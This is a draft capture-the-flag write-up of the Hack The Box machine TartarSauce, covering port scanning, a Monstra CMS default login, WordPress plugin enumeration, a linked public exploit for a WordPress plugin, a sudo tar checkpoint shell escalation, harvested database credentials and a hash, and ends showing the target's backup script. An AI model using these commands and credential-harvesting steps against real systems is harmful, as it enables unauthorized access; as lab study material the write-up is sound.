---
title: HTB TartarSauce
date: 2026-03-02
author: kei5uke
draft: true
description: Writeup for HTB TartarSauce
tags:
  - linux
  - writeup
---

# Nmap

```bash
# Nmap 7.95 scan initiated Mon Mar  2 16:52:29 2026 as: /usr/lib/nmap/nmap -T4 -p- -sC -sV -oN nmap.tcp.txt -v 10.129.1.185
Nmap scan report for 10.129.1.185
Host is up (0.030s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Landing Page
| http-robots.txt: 5 disallowed entries 
| /webservices/tar/tar/source/ 
| /webservices/monstra-3.0.4/ /webservices/easy-file-uploader/ 
|_/webservices/developmental/ /webservices/phpmyadmin/
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
```

# HTTP p80

robots.txt

```bash
User-agent: *
Disallow: /webservices/tar/tar/source/ # 404
Disallow: /webservices/monstra-3.0.4/
Disallow: /webservices/easy-file-uploader/ # 404
Disallow: /webservices/developmental/ # 404
Disallow: /webservices/phpmyadmin/ # 404
```

---

`http://10.129.1.185/webservices/monstra-3.0.4/`

Login, Register feature, etc

![[HTB TartarSauce - image.png]]

`Powered by Monstra 3.0.4`

Login only works

User credential: `admin:admin`

![[HTB TartarSauce - image 1.png]]

[https://github.com/wcheng729/Monstra-3.0.4-RCE](https://github.com/wcheng729/Monstra-3.0.4-RCE)

Uploading shell to theme does not work

---

Found WordPress website

`wpscan --url [http://tartarsauce.htb/webservices/wp](http://tartarsauce.htb/webservices/wp) --enumerate p --plugins-detection aggressive`

![[HTB TartarSauce - Screenshot_2026-03-13_at_16.52.51.png]]

# Shell

This gets you shell: 

[https://raw.githubusercontent.com/G4sp4rCS/exploit-CVE-2015-8351/refs/heads/main/exploit.py](https://raw.githubusercontent.com/G4sp4rCS/exploit-CVE-2015-8351/refs/heads/main/exploit.py)

This gives you a shell:

`sudo -u onuma tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh`

`/usr/bin/python3 -c "import pty; pty.spawn('/bin/bash')"`

```
$ ls -la
ls -la
total 40
drwxrw---- 5 onuma onuma 4096 May 12  2022 .
drwxr-xr-x 3 root  root  4096 May 12  2022 ..
lrwxrwxrwx 1 root  root     9 Feb 17  2018 .bash_history -> /dev/null
-rwxrw---- 1 onuma onuma  220 Feb  9  2018 .bash_logout
-rwxrw---- 1 onuma onuma 3871 Feb 15  2018 .bashrc
drwxrw---- 2 onuma onuma 4096 May 12  2022 .cache
-rwxrw---- 1 onuma onuma   52 Feb 17  2018 .mysql_history
drwxrw---- 2 onuma onuma 4096 May 12  2022 .nano
-rwxrw---- 1 onuma onuma  655 Feb  9  2018 .profile
drwxrw---- 2 onuma onuma 4096 Mar 13 12:39 .ssh
-rwxrw---- 1 onuma onuma    0 Feb  9  2018 .sudo_as_admin_successful
lrwxrwxrwx 1 root  root     9 Feb 17  2018 shadow_bkp -> /dev/null
-r-------- 1 onuma onuma   33 Mar 12 16:28 user.txt

```

mysql history 

```
onuma@TartarSauce:~$ sed "s/\\\040/ /g" < .mysql_history
sed "s/\\\040/ /g" < .mysql_history
_HiStOrY_V2_
create database backuperer;
exi
```

Linpeas

```
╔══════════╣ Searching passwords in config PHP files
/var/www/html/webservices/wp/wp-admin/setup-config.php: $pwd = trim( wp_unslash( $_POST[ 'pwd' ] ) );
/var/www/html/webservices/wp/wp-admin/setup-config.php: define('DB_PASSWORD', $pwd);
/var/www/html/webservices/wp/wp-admin/setup-config.php: define('DB_USER', $uname);
/var/www/html/webservices/wp/wp-config.php:define('DB_PASSWORD', 'w0rdpr3$$d@t@b@$3@cc3$$');
/var/www/html/webservices/wp/wp-config.php:define('DB_USER', 'wpuser');
```

`uid=1000(onuma) gid=1000(onuma) groups=1000(onuma),24(cdrom),30(dip),46(plugdev)`

---

MySQL

`mysql -u wpuser -p`

`w0rdpr3$$d@t@b@$3@cc3$$`

```
mysql> show databases;
show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| wp                 |
+--------------------+
```

---

Credentials from DB:  `wpadmin`:`$P$BBU0yjydBz9THONExe2kPEsvtjStGe1`

`hashcat -m 400 hash.txt /usr/share/wordlists/rockyou.txt` This does not work

`/var/www/html/webservices/wp` : Cant find any interesting info

---

`/var/www/html/webservices/monstra-3.0.4`

```
www-data@TartarSauce:/var/www/html/webservices/monstra-3.0.4$ cat .gitignore
cat .gitignore
# ignore os/app generated files
Thumbs.db
.DS_Store
*.esproj
*.project
*.sublime-project
*.sublime-workspace

# ignore user .htaccess
/.htaccess

# ignore user sitemap
/sitemap.xml

# ignore user defines
/monstra/boot/defines.php

# ignore debug and custom themes
/public/themes/*
/admin/themes/*
!/public/themes/default
!/admin/themes/default

# ignore user plugins
/plugins/*
!/plugins/box
!/plugins/captcha
!/plugins/markitup
!/plugins/sandbox

# ignore user files and folders
/backups/*
/public/*
/storage/*

```

`/var/www/html/webservices/monstra-3.0.4/storage/database/users.table.xml`

```
<users>
		<id>1</id>
		<uid>af45a48ed8</uid>
		<password>5d1e3697d706b0e24e574b56e79affda</password>
		<hash>jB64OpMOWGxq</hash>
		<date_registered>1519235295</date_registered>
		<login>admin</login>
		<firstname/>
		<lastname/>
		<email>test@test.local</email>
		<skype/>
		<twitter/>
		<about_me>I like falafel with tartar sauce.</about_me>
		<role>admin</role>
	</users>
```

![[HTB TartarSauce - image 2.png]]

```
#!/bin/bash

#-------------------------------------------------------------------------------------
# backuperer ver 1.0.2 - by ȜӎŗgͷͼȜ
# ONUMA Dev auto backup program
# This tool will keep our webapp backed up incase another skiddie defaces us again.
# We will be able to quickly restore from a backup in seconds ;P
#-------------------------------------------------------------------------------------

# Set Vars Here
basedir=/var/www/html
bkpdir=/var/backups
tmpdir=/var/tmp
testmsg=$bkpdir/onuma_backup_test.txt
errormsg=$bkpdir/onuma_backup_error.txt
tmpfile=$tmpdir/.$(/usr/bin/head -c100 /dev/urandom |sha1sum|cut -d' ' -f1)
check=$tmpdir/check

# formatting
printbdr()
{
    for n in $(seq 72);
    do /usr/bin/printf $"-";
    done
}
bdr=$(printbdr)

# Added a test file to let us see when the last backup was run
/usr/bin/printf $"$bdr\nAuto backup backuperer backup last ran at : $(/bin/date)\n$bdr\n" > $testmsg

# Cleanup from last time.
/bin/rm -rf $tmpdir/.* $check

# Backup onuma website dev files.
/usr/bin/sudo -u onuma /bin/tar -zcvf $tmpfile $basedir &

# Added delay to wait for backup to complete if large files get added.
/bin/sleep 30

# Test the backup integrity
integrity_chk()
{
    /usr/bin/diff -r $basedir $check$basedir
}

/bin/mkdir $check
/bin/tar -zxvf $tmpfile -C $check
if [[ $(integrity_chk) ]]
then
    # Report errors so the dev can investigate the issue.
    /usr/bin/printf $"$bdr\nIntegrity Check Error in backup last ran :  $(/bin/date)\n$bdr\n$tmpfile\n" >> $errormsg
    integrity_chk >> $errormsg
    exit 2
else
    # Clean up and save archive to the bkpdir.
    /bin/mv $tmpfile $bkpdir/onuma-www-dev.bak
    /bin/rm -rf $check .*
    exit 0
fi
```
